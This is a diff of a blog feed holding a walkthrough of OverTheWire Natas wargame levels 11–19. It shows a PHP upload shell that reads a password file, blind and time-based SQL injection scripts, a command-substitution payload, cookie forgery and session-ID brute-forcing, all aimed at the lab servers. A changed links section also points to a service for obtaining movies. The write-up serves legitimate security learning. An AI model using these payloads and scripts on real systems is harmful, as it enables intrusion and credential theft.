@@ -130,8 +130,8 @@ The dot tells grep to print indiscriminately. The (&amp;lt;) tells grep to get t
 P XOR K = C
 C XOR K = P&lt;/p&gt;
 &lt;p&gt;Great, so in our case what are the ciphertext and plaintext? Well, the plaintext would be the json encoding of $defaultdata, and the ciphertext would be found in our cookies! The ciphertext is base64 encoded as per the source code, so we first need to decode that.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;P: {&amp;quot;showpassword&amp;quot;: &amp;quot;no&amp;quot;, &amp;quot;bgcolor&amp;quot;: &amp;quot;#ffffff&amp;quot;}
-C: 0l;$$98-8=?#9*jvi &#39;ngl*+(!$#9lrnh(.*-(.n6
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;P: {&amp;#34;showpassword&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;bgcolor&amp;#34;: &amp;#34;#ffffff&amp;#34;}
+C: 0l;$$98-8=?#9*jvi &amp;#39;ngl*+(!$#9lrnh(.*-(.n6
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To XOR these together I simply stole the source code, set the $key value to our plaintext, and called the xor_encrypt() function on the ciphertext. I ran it using a PHP interpreter and echoed the result.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas11-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;The repeating characters are the key. &amp;ldquo;KNHL&amp;rdquo;. Now that we have the XOR key, all we have to do is encode our own cookie and place it in to the browser. I will once again use the source code to do this, but this time placing our key into $key, placing the modified json pair into the argument of xor_encrypt(), and running base64_encode on the result.&lt;/p&gt;
@@ -149,8 +149,8 @@ C: 0l;$$98-8=?#9*jvi &#39;ngl*+(!$#9lrnh(.*-(.n6
 &lt;p&gt;The extension is defined by the input tag named &amp;ldquo;filename&amp;rdquo; in the form. We can directly edit the extension since it is declared explicitly in the html. Doing this before uploading the file will allow PHP uploads.&lt;/p&gt;
 &lt;p&gt;Now that we bypassed the extension, we need to write a PHP script that will read out the password file to the screen. To run linux commands on the server we can use the passthru PHP function.&lt;/p&gt;
 &lt;p&gt;Here is a simple script that will read the password file to the screen.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;&amp;lt;?php
-	echo(passthru(&amp;quot;cat /etc/natas_webpass/natas13&amp;quot;));
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+	echo(passthru(&amp;#34;cat /etc/natas_webpass/natas13&amp;#34;));
 ?&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
 &lt;h2 id=&#34;level-13&#34;&gt;Level 13&lt;/h2&gt;
@@ -185,40 +185,40 @@ C: 0l;$$98-8=?#9*jvi &#39;ngl*+(!$#9lrnh(.*-(.n6
 &lt;/ul&gt;
 &lt;p&gt;With the given information, it&amp;rsquo;s highly probable that I will have to find a way to return the password using SQL injection and interpreting binary responses in a way that tells us the password. The obvious answer here is char-by-char guessing.&lt;/p&gt;
 &lt;p&gt;Each character of the password is alphanumeric, so each char has 62 possible values. If we multiply this by 32 characters in the password, we get 1,984. In other words, we only need to make 1,984 requests to the database. My testing shows that an average response from the server takes about a third of a second. So we can reasonably get the entire password in just a few minutes. So how do we actually go about guessing the letters? I&amp;rsquo;ve written a python script to do just that.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;import requests
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import requests
 
-url = &amp;quot;http://natas15.natas.labs.overthewire.org&amp;quot;
-credentials = (&amp;quot;natas15&amp;quot;, &amp;quot;{censored}&amp;quot;)
-form_data = {&amp;quot;username&amp;quot;: &amp;quot;x&amp;quot;}
-password=&amp;quot;&amp;quot;
+url = &amp;#34;http://natas15.natas.labs.overthewire.org&amp;#34;
+credentials = (&amp;#34;natas15&amp;#34;, &amp;#34;{censored}&amp;#34;)
+form_data = {&amp;#34;username&amp;#34;: &amp;#34;x&amp;#34;}
+password=&amp;#34;&amp;#34;
 
 alphanumeric_chars = [
-&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;,
-&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;,
-&#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;,
-&#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,
-&#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;,
-&#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;,
-&#39;y&#39;, &#39;z&#39;
+&amp;#39;0&amp;#39;, &amp;#39;1&amp;#39;, &amp;#39;2&amp;#39;, &amp;#39;3&amp;#39;, &amp;#39;4&amp;#39;, &amp;#39;5&amp;#39;, &amp;#39;6&amp;#39;, &amp;#39;7&amp;#39;, &amp;#39;8&amp;#39;, &amp;#39;9&amp;#39;,
+&amp;#39;A&amp;#39;, &amp;#39;B&amp;#39;, &amp;#39;C&amp;#39;, &amp;#39;D&amp;#39;, &amp;#39;E&amp;#39;, &amp;#39;F&amp;#39;, &amp;#39;G&amp;#39;, &amp;#39;H&amp;#39;, &amp;#39;I&amp;#39;, &amp;#39;J&amp;#39;,
+&amp;#39;K&amp;#39;, &amp;#39;L&amp;#39;, &amp;#39;M&amp;#39;, &amp;#39;N&amp;#39;, &amp;#39;O&amp;#39;, &amp;#39;P&amp;#39;, &amp;#39;Q&amp;#39;, &amp;#39;R&amp;#39;, &amp;#39;S&amp;#39;, &amp;#39;T&amp;#39;,
+&amp;#39;U&amp;#39;, &amp;#39;V&amp;#39;, &amp;#39;W&amp;#39;, &amp;#39;X&amp;#39;, &amp;#39;Y&amp;#39;, &amp;#39;Z&amp;#39;, &amp;#39;a&amp;#39;, &amp;#39;b&amp;#39;, &amp;#39;c&amp;#39;, &amp;#39;d&amp;#39;,
+&amp;#39;e&amp;#39;, &amp;#39;f&amp;#39;, &amp;#39;g&amp;#39;, &amp;#39;h&amp;#39;, &amp;#39;i&amp;#39;, &amp;#39;j&amp;#39;, &amp;#39;k&amp;#39;, &amp;#39;l&amp;#39;, &amp;#39;m&amp;#39;, &amp;#39;n&amp;#39;,
+&amp;#39;o&amp;#39;, &amp;#39;p&amp;#39;, &amp;#39;q&amp;#39;, &amp;#39;r&amp;#39;, &amp;#39;s&amp;#39;, &amp;#39;t&amp;#39;, &amp;#39;u&amp;#39;, &amp;#39;v&amp;#39;, &amp;#39;w&amp;#39;, &amp;#39;x&amp;#39;,
+&amp;#39;y&amp;#39;, &amp;#39;z&amp;#39;
 ]
 
 for i in range(1, 33):
   for j in alphanumeric_chars:
-    form_data[&amp;quot;username&amp;quot;] = f&amp;quot;natas16\&amp;quot; AND ASCII(SUBSTRING(password, {i}, 1)) = {ord(j)}#&amp;quot;
+    form_data[&amp;#34;username&amp;#34;] = f&amp;#34;natas16\&amp;#34; AND ASCII(SUBSTRING(password, {i}, 1)) = {ord(j)}#&amp;#34;
     
 	# Make the cURL request
 	
 	response = requests.post(url, auth=credentials, data=form_data)
 	
-	if &amp;quot;exists&amp;quot; in response.text:
+	if &amp;#34;exists&amp;#34; in response.text:
 	  password += j
 
-	print(f&amp;quot;Current guess: {i}{j}:&amp;quot;)
-	print(&amp;quot;Status code:&amp;quot;, response.status_code)
-	print(&amp;quot;Content:&amp;quot;, response.text)
-	print(&amp;quot;--------------------&amp;quot;)
-	print(f&amp;quot;password: {password}&amp;quot;)
-	if &amp;quot;exists&amp;quot; in response.text:
+	print(f&amp;#34;Current guess: {i}{j}:&amp;#34;)
+	print(&amp;#34;Status code:&amp;#34;, response.status_code)
+	print(&amp;#34;Content:&amp;#34;, response.text)
+	print(&amp;#34;--------------------&amp;#34;)
+	print(f&amp;#34;password: {password}&amp;#34;)
+	if &amp;#34;exists&amp;#34; in response.text:
       break
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;My concept is a two-dimensional loop. On the outside, iterating over the chars of the string (1-32) and, inside of that, iterating over possible values for those chars(a-z, A-Z, 0-9).&lt;/p&gt;
 &lt;p&gt;On each iteration, I make a curl request to the site using the credentials and include a variable value for the &amp;ldquo;username&amp;rdquo; input depending on the current iteration. The form data contains SQL injection code in the username field. Then if a char is correct (meaning: the request response contains the word &amp;ldquo;exists&amp;rdquo;) then the char is appended to an undeclared password string variable and we break out of the loop to avoid guessing more chars that we know will be false.&lt;/p&gt;
@@ -230,7 +230,7 @@ for i in range(1, 33):
 &lt;hr&gt;
 &lt;h2 id=&#34;level-16&#34;&gt;Level 16&lt;/h2&gt;
 &lt;p&gt;Natas16 is revisiting the search form that executes grep which we found in 9 and 10. This time even more characters are filtered. To be precise, we can no longer use the following characters:&lt;/p&gt;
-&lt;p&gt;; | &amp;amp; ` &#39; &amp;quot;&lt;/p&gt;
+&lt;p&gt;; | &amp;amp; ` &amp;rsquo; &amp;quot;&lt;/p&gt;
 &lt;p&gt;and our input is placed in this PHP statement:&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;passthru(&amp;quot;grep -i \&amp;quot;{input here}\&amp;quot; dictionary.txt);&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;This makes things quite a bit more challenging. After &lt;em&gt;extensive&lt;/em&gt; efforts, I can not find a way to escape the double quotes and override the execution of grep. This means we will have to find some way to do everything within the context of grepping the dictionary file.&lt;/p&gt;
@@ -262,48 +262,48 @@ for i in range(1, 33):
 &lt;p&gt;If this is confusing, I&amp;rsquo;ve made a terrible mspaint drawing to try to explain better. Observe.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas16-3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;The only problem with this is that grep can only work on files. I also tried using &amp;laquo;&amp;lt; to have the char act as an input to grep, but for some strange reason I cannot get that to work. Whatever shell is used on the server seems to ignore it, despite the less-than sign not being explicitly filtered in the source code. No problem, we can just make a script to create a bunch of files on the server containing the chars. We have write access to the /tmp/ directory, so I&amp;rsquo;ve used the following script:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;import requests
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import requests
 
-url = &amp;quot;http://natas16.natas.labs.overthewire.org&amp;quot;
-credentials = (&amp;quot;natas16&amp;quot;, &amp;quot;{censored}&amp;quot;)
-form_data = {&amp;quot;needle&amp;quot;: &amp;quot;x&amp;quot;}
+url = &amp;#34;http://natas16.natas.labs.overthewire.org&amp;#34;
+credentials = (&amp;#34;natas16&amp;#34;, &amp;#34;{censored}&amp;#34;)
+form_data = {&amp;#34;needle&amp;#34;: &amp;#34;x&amp;#34;}
 
 for i in range(1,33):
-    form_data[&amp;quot;needle&amp;quot;] = f&amp;quot;$(echo $(cut -c {i} /etc/natas_webpass/natas17) &amp;gt; /tmp/char{i})&amp;quot;
+    form_data[&amp;#34;needle&amp;#34;] = f&amp;#34;$(echo $(cut -c {i} /etc/natas_webpass/natas17) &amp;gt; /tmp/char{i})&amp;#34;
 
         # Make the cURL request
 
     response = requests.post(url, auth=credentials, data=form_data)
 
-    print(&amp;quot;Status code:&amp;quot;, response.status_code)
-    print(&amp;quot;Content:&amp;quot;, response.text)
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The end result is a bunch of files named &amp;ldquo;char&amp;rsquo;x&#39;&amp;rdquo; where x is the index of the string. Each file contains the char found at the corresponding index. Now we can use those files as input to grep.&lt;/p&gt;
+    print(&amp;#34;Status code:&amp;#34;, response.status_code)
+    print(&amp;#34;Content:&amp;#34;, response.text)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The end result is a bunch of files named &amp;ldquo;char&amp;rsquo;x&amp;rsquo;&amp;rdquo; where x is the index of the string. Each file contains the char found at the corresponding index. Now we can use those files as input to grep.&lt;/p&gt;
 &lt;p&gt;Again, it&amp;rsquo;s much faster to use a script than to manually run our grep command twice for each alpha char (50-60 times!). I&amp;rsquo;ve written this script which will run our new grep command in the form and pause on each guess to allow me to see the output and judge whether there was a match and write down the correct case of the char.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;import requests
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import requests
 
-url = &amp;quot;http://natas16.natas.labs.overthewire.org&amp;quot;
-credentials = (&amp;quot;natas16&amp;quot;, &amp;quot;{censored}&amp;quot;)
-form_data = {&amp;quot;needle&amp;quot;: &amp;quot;x&amp;quot;}
+url = &amp;#34;http://natas16.natas.labs.overthewire.org&amp;#34;
+credentials = (&amp;#34;natas16&amp;#34;, &amp;#34;{censored}&amp;#34;)
+form_data = {&amp;#34;needle&amp;#34;: &amp;#34;x&amp;#34;}
 
-password = &amp;quot;xkeuche0sbnkbvh1ru7ksib9uulmi7sd&amp;quot;
+password = &amp;#34;xkeuche0sbnkbvh1ru7ksib9uulmi7sd&amp;#34;
 
 for i in range(1,33):
-    form_data[&amp;quot;needle&amp;quot;] = f&amp;quot;$(grep -o {password[i-1]} /tmp/char{i})&amp;quot;
+    form_data[&amp;#34;needle&amp;#34;] = f&amp;#34;$(grep -o {password[i-1]} /tmp/char{i})&amp;#34;
 
     response = requests.post(url, auth=credentials, data=form_data)
 
-    print(&amp;quot;Status code:&amp;quot;, response.status_code)
-    print(&amp;quot;Content:&amp;quot;, response.text)
-    print(f&amp;quot;current guess: {password[i-1]}&amp;quot;)
+    print(&amp;#34;Status code:&amp;#34;, response.status_code)
+    print(&amp;#34;Content:&amp;#34;, response.text)
+    print(f&amp;#34;current guess: {password[i-1]}&amp;#34;)
     wait = input()
 
-    form_data[&amp;quot;needle&amp;quot;] = f&amp;quot;$(grep -o {password[i-1].upper()} /tmp/char{i})&amp;quot;
+    form_data[&amp;#34;needle&amp;#34;] = f&amp;#34;$(grep -o {password[i-1].upper()} /tmp/char{i})&amp;#34;
 
     response = requests.post(url, auth=credentials, data=form_data)
 
-    print(&amp;quot;Status code:&amp;quot;, response.status_code)
-    print(&amp;quot;Content:&amp;quot;, response.text)
-    print(f&amp;quot;current guess: {password[i-1].upper()}&amp;quot;)
+    print(&amp;#34;Status code:&amp;#34;, response.status_code)
+    print(&amp;#34;Content:&amp;#34;, response.text)
+    print(f&amp;#34;current guess: {password[i-1].upper()}&amp;#34;)
     wait = input()
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I will not spoil the final password, but the script did allow me to get the correct case of each char and move on to the next level.&lt;/p&gt;
 &lt;p&gt;This was the hardest level yet for sure. I kept coming back to it over the course of a couple weeks before I finally figured it out. It&amp;rsquo;s hard to say whether this was even close to the intended solution. I still wonder whether there was a way of escaping the quotes that I overlooked.&lt;/p&gt;
@@ -311,27 +311,27 @@ for i in range(1,33):
 &lt;h2 id=&#34;level-17&#34;&gt;Level 17&lt;/h2&gt;
 &lt;p&gt;This level has the same source code as level 15 except that it no longer let&amp;rsquo;s us know whether the user exists. Effectively this leaves us with no feedback to go on. To get around this, there is a MySQL function called &amp;ldquo;SLEEP()&amp;rdquo; that we can use. The sleep function can be used anywhere you would place a condition such as &amp;ldquo;username=&amp;rdquo;. The time it takes for the response to come back from the server can indicate whether the sleep function was used. So if we order the SQL server to sleep when we make a correct guess (refer to level15 above) then the response time will provide a signal for the script to save that character.&lt;/p&gt;
 &lt;p&gt;It stands to reason that we can just take the script from Level 15 and tweak it a bit, since the problem is largely the same.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;import time
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import time
 import requests
 
-url = &amp;quot;http://natas17.natas.labs.overthewire.org&amp;quot;
-credentials = (&amp;quot;natas17&amp;quot;, &amp;quot;{censored}&amp;quot;)
-form_data = {&amp;quot;username&amp;quot;: &amp;quot;x&amp;quot;}
-password=&amp;quot;&amp;quot;
+url = &amp;#34;http://natas17.natas.labs.overthewire.org&amp;#34;
+credentials = (&amp;#34;natas17&amp;#34;, &amp;#34;{censored}&amp;#34;)
+form_data = {&amp;#34;username&amp;#34;: &amp;#34;x&amp;#34;}
+password=&amp;#34;&amp;#34;
 
 alphanumeric_chars = [
-&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;,
-&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;,
-&#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;,
-&#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,
-&#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;,
-&#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;,
-&#39;y&#39;, &#39;z&#39;
+&amp;#39;0&amp;#39;, &amp;#39;1&amp;#39;, &amp;#39;2&amp;#39;, &amp;#39;3&amp;#39;, &amp;#39;4&amp;#39;, &amp;#39;5&amp;#39;, &amp;#39;6&amp;#39;, &amp;#39;7&amp;#39;, &amp;#39;8&amp;#39;, &amp;#39;9&amp;#39;,
+&amp;#39;A&amp;#39;, &amp;#39;B&amp;#39;, &amp;#39;C&amp;#39;, &amp;#39;D&amp;#39;, &amp;#39;E&amp;#39;, &amp;#39;F&amp;#39;, &amp;#39;G&amp;#39;, &amp;#39;H&amp;#39;, &amp;#39;I&amp;#39;, &amp;#39;J&amp;#39;,
+&amp;#39;K&amp;#39;, &amp;#39;L&amp;#39;, &amp;#39;M&amp;#39;, &amp;#39;N&amp;#39;, &amp;#39;O&amp;#39;, &amp;#39;P&amp;#39;, &amp;#39;Q&amp;#39;, &amp;#39;R&amp;#39;, &amp;#39;S&amp;#39;, &amp;#39;T&amp;#39;,
+&amp;#39;U&amp;#39;, &amp;#39;V&amp;#39;, &amp;#39;W&amp;#39;, &amp;#39;X&amp;#39;, &amp;#39;Y&amp;#39;, &amp;#39;Z&amp;#39;, &amp;#39;a&amp;#39;, &amp;#39;b&amp;#39;, &amp;#39;c&amp;#39;, &amp;#39;d&amp;#39;,
+&amp;#39;e&amp;#39;, &amp;#39;f&amp;#39;, &amp;#39;g&amp;#39;, &amp;#39;h&amp;#39;, &amp;#39;i&amp;#39;, &amp;#39;j&amp;#39;, &amp;#39;k&amp;#39;, &amp;#39;l&amp;#39;, &amp;#39;m&amp;#39;, &amp;#39;n&amp;#39;,
+&amp;#39;o&amp;#39;, &amp;#39;p&amp;#39;, &amp;#39;q&amp;#39;, &amp;#39;r&amp;#39;, &amp;#39;s&amp;#39;, &amp;#39;t&amp;#39;, &amp;#39;u&amp;#39;, &amp;#39;v&amp;#39;, &amp;#39;w&amp;#39;, &amp;#39;x&amp;#39;,
+&amp;#39;y&amp;#39;, &amp;#39;z&amp;#39;
 ]
 
 for i in range(1, 33):
     for j in alphanumeric_chars:
-        form_data[&amp;quot;username&amp;quot;] = f&amp;quot;natas18\&amp;quot; AND ASCII(SUBSTRING(password, {i}, 1)) = {ord(j)} AND SLEEP(5) #&amp;quot;
+        form_data[&amp;#34;username&amp;#34;] = f&amp;#34;natas18\&amp;#34; AND ASCII(SUBSTRING(password, {i}, 1)) = {ord(j)} AND SLEEP(5) #&amp;#34;
   
         # make curl request and measure elapsed time
         start = time.time()
@@ -340,29 +340,29 @@ for i in range(1, 33):
         
         if (end-start) &amp;gt; 5:
             password += j
-            print(f&amp;quot;index: {i}\nguess: {j}&amp;quot;)
-            print(&amp;quot;Status code:&amp;quot;, response.status_code)
-            print(&amp;quot;Response time:&amp;quot;, str(round(end-start, 2)) +&amp;quot;s&amp;quot;)
-            print(f&amp;quot;Password: {password}&amp;quot;)
+            print(f&amp;#34;index: {i}\nguess: {j}&amp;#34;)
+            print(&amp;#34;Status code:&amp;#34;, response.status_code)
+            print(&amp;#34;Response time:&amp;#34;, str(round(end-start, 2)) +&amp;#34;s&amp;#34;)
+            print(f&amp;#34;Password: {password}&amp;#34;)
             break
 &lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
 &lt;h2 id=&#34;level-18&#34;&gt;Level 18&lt;/h2&gt;
 &lt;p&gt;This level has a login form. It states that you need to login as admin to get the credentials to the next level. Looking at the source code, the actual login box essentially does nothing. It instead relies on PHP session ID for authentication. The max possible ID is 640. I plotted the program&amp;rsquo;s flow on a chart to get a better understanding.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas18-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;I couldn&amp;rsquo;t really find any way to exploit this, but it occurred to me that there is likely an ID which already has its admin flag set to 1. With such a low number of possible IDs, I could easily bruteforce the session ID to find an admin session. Here is a script I created to do just that:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;import requests
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import requests
 
-url = &amp;quot;http://natas18.natas.labs.overthewire.org&amp;quot;
-credentials = (&amp;quot;natas18&amp;quot;, &amp;quot;{censored}&amp;quot;)
-form_data = {&amp;quot;username&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;password&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;debug&amp;quot;: &amp;quot;&amp;quot;}
-cookie_data = {&amp;quot;PHPSESSID&amp;quot;: &amp;quot;x&amp;quot;}
+url = &amp;#34;http://natas18.natas.labs.overthewire.org&amp;#34;
+credentials = (&amp;#34;natas18&amp;#34;, &amp;#34;{censored}&amp;#34;)
+form_data = {&amp;#34;username&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;password&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;debug&amp;#34;: &amp;#34;&amp;#34;}
+cookie_data = {&amp;#34;PHPSESSID&amp;#34;: &amp;#34;x&amp;#34;}
 
 for i in range(1, 640):
-        cookie_data[&amp;quot;PHPSESSID&amp;quot;] = str(i)
+        cookie_data[&amp;#34;PHPSESSID&amp;#34;] = str(i)
         response = requests.get(url, cookies=cookie_data, auth=credentials, data=form_data)
         print(response.text)
-        print(&amp;quot;guess:&amp;quot;, i)
-        if &amp;quot;Password&amp;quot; in response.text:
+        print(&amp;#34;guess:&amp;#34;, i)
+        if &amp;#34;Password&amp;#34; in response.text:
 
             break
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sure enough, one particular ID granted the password.&lt;/p&gt;
@@ -374,25 +374,25 @@ for i in range(1, 640):
 &lt;p&gt;If we now login with a username, we get back a longer cookie. This time it will again be the same random id with a hyphen, but added onto the end is a hex ascii representation of the username typed in.&lt;/p&gt;
 &lt;p&gt;Using a password does nothing, which tells me that the password is not implemented at all, most likely.&lt;/p&gt;
 &lt;p&gt;So since we need to login as admin, we can be sure that the suffix of the cookie needs to be &amp;ldquo;61646d696e&amp;rdquo;. Then we can just try using all 640 possible values with the admin suffix added at the end until one of them works. Here&amp;rsquo;s the script I used for that:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;import requests
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import requests
 
-url = &amp;quot;http://natas19.natas.labs.overthewire.org&amp;quot;
-credentials = (&amp;quot;natas19&amp;quot;, &amp;quot;{censored}&amp;quot;)
-form_data = {&amp;quot;username&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;password&amp;quot;: &amp;quot;&amp;quot;}
-cookie_data = {&amp;quot;PHPSESSID&amp;quot;: &amp;quot;x&amp;quot;}
+url = &amp;#34;http://natas19.natas.labs.overthewire.org&amp;#34;
+credentials = (&amp;#34;natas19&amp;#34;, &amp;#34;{censored}&amp;#34;)
+form_data = {&amp;#34;username&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;password&amp;#34;: &amp;#34;&amp;#34;}
+cookie_data = {&amp;#34;PHPSESSID&amp;#34;: &amp;#34;x&amp;#34;}
   
 for i in range(1, 640):
-        # convert id to hex and append &amp;quot;admin&amp;quot; suffix
-        cookie_data[&amp;quot;PHPSESSID&amp;quot;] = &amp;quot;&amp;quot;
+        # convert id to hex and append &amp;#34;admin&amp;#34; suffix
+        cookie_data[&amp;#34;PHPSESSID&amp;#34;] = &amp;#34;&amp;#34;
         for j in str(i):
-              cookie_data[&amp;quot;PHPSESSID&amp;quot;] += hex(ord(j)).lstrip(&amp;quot;0x&amp;quot;)
-        cookie_data[&amp;quot;PHPSESSID&amp;quot;] += &amp;quot;2d61646d696e&amp;quot;
+              cookie_data[&amp;#34;PHPSESSID&amp;#34;] += hex(ord(j)).lstrip(&amp;#34;0x&amp;#34;)
+        cookie_data[&amp;#34;PHPSESSID&amp;#34;] += &amp;#34;2d61646d696e&amp;#34;
         
         response = requests.post(url, cookies=cookie_data, auth=credentials, data=form_data)
         print(response.text)
-        print(&amp;quot;guess:&amp;quot;, i, &amp;quot;|&amp;quot;, cookie_data[&amp;quot;PHPSESSID&amp;quot;])
+        print(&amp;#34;guess:&amp;#34;, i, &amp;#34;|&amp;#34;, cookie_data[&amp;#34;PHPSESSID&amp;#34;])
 
-        if &amp;quot;You are logged in as a regular user.&amp;quot; not in response.text:
+        if &amp;#34;You are logged in as a regular user.&amp;#34; not in response.text:
             break
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I was able to get the password to natas20 by running this script.&lt;/p&gt;
 &lt;hr&gt;
@@ -409,30 +409,52 @@ for i in range(1, 640):
         <pubDate>Wed, 21 Jun 2023 18:16:22 -0400</pubDate>
         
         <guid>https://koolaidxk1d.github.io/posts/links/</guid>
-        <description>koolaidxk1d https://koolaidxk1d.github.io/posts/links/ -&lt;p&gt;&lt;a href=&#34;https://based.cooking/&#34;&gt;https://based.cooking/&lt;/a&gt; - simple recipe website without the web bloat&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://superuser.com/a/1491153&#34;&gt;https://superuser.com/a/1491153&lt;/a&gt; - using angle bracket redirects&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://slipfox.xyz&#34;&gt;https://slipfox.xyz&lt;/a&gt; - free uploads, link shortening, and way more&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://teachyourselfcs.com/&#34;&gt;https://teachyourselfcs.com/&lt;/a&gt; - roadmap for self-taught CS education&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.xyz/&#34;&gt;https://book.hacktricks.xyz/&lt;/a&gt; - wiki with some useful info&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://cheatsheetseries.owasp.org/index.html&#34;&gt;https://cheatsheetseries.owasp.org/index.html&lt;/a&gt; - OWASP Cheat Sheets&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://evoxt.com/&#34;&gt;https://evoxt.com/&lt;/a&gt; - cheap VPS, good customer support&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://new.reddit.com/r/hacking/wiki/index/&#34;&gt;https://new.reddit.com/r/hacking/wiki/index/&lt;/a&gt; - good resources listed here&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;https://gchq.github.io/CyberChef/&lt;/a&gt; - Extremely useful all-in-one hacking web tool&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://dogbolt.org&#34;&gt;https://dogbolt.org&lt;/a&gt; - Online decompiler&lt;/p&gt;
+        <description>koolaidxk1d https://koolaidxk1d.github.io/posts/links/ -&lt;h2 id=&#34;services&#34;&gt;Services&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://evoxt.com/&#34;&gt;evoxt.com&lt;/a&gt; - cheap VPS, good customer support&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://real-debrid.com/&#34;&gt;real-debrid.com&lt;/a&gt; - very cheap, unlocks all paid filehost websites (1fichier etc.). Also converts torrents to direct http downloads. A must-have for movie obtainers.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;web-tools&#34;&gt;Web Tools&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.deepl.com/en/translator/&#34;&gt;deepl/translator&lt;/a&gt; - better than google translate&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://photopea.com/&#34;&gt;Photopea&lt;/a&gt; - photoshop clone, free, no signup&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://excalidraw.com/&#34;&gt;excalidraw&lt;/a&gt; - like ms paint, free, no signup&lt;/p&gt;
